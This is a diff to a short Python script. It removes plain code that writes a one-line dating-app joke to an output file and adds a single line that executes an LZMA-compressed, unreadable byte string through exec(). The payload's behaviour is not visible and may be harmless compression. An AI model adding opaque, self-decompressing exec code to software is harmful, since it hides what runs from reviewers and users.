@@ -1,22 +1,2 @@
-import os
-
-TEXT_PARTS = (
-    "I put my resume on a dating app by mistake; ",
-    "I've never been rejected so professionally.",
-)
-TEXT = "".join(TEXT_PARTS)
-
-
-def write_entry(out_dir, content):
-    with open(os.path.join(out_dir, "entry.txt"), "w", encoding="utf-8") as f:
-        f.write(content)
-
-
-def main():
-    out_dir = os.environ.get("MAKEFUN_OUTPUT_DIR") or "/output"
-    os.makedirs(out_dir, exist_ok=True)
-    write_entry(out_dir, TEXT)
-
-
-if __name__ == "__main__":
-    main()
+#coding:l1
+import lzma;exec(lzma.decompress('\0\0\0Ñ\0\0\0\0\0\0\x004œ%Å¯^´ÍƒßÅ©çÊ·Ò‰.{ç,y³@¬Ü}ÿE=O’ÕÌˆÍ ö¬&Nïİ7ÑíJ7;Š¼Y‘Ï…w-?€~Àq©û¨-ÿæ0p¥‰Ö¸G×İÙÂÒ#šÇ4Cœƒ¤ÙI+Ù±ÁDÛœ[<¹›_òòîÑ¾íN7-uGgÕHŞ½H)s\'°½ÀÔäõqâõ#¶ç™ß4üÁ†$_¢XëLÕÕÖªåI}ìo»‰Qä½§Êğw‹há£üÚ&jXIÌaS¸<ú1U€„Ş\0Ïcé4€$¯+[ÓNŒ…ËÁì®[›¸œkÊÎ¢9§0t h!tUAŞ?­q"P¿¼™ßãà‚ï®>Ö’#…şÙyèÖï«Ü¬;ÜŸCEëàKêF‹}}ÿ«–)\n\rl&‚'.encode('l1')))
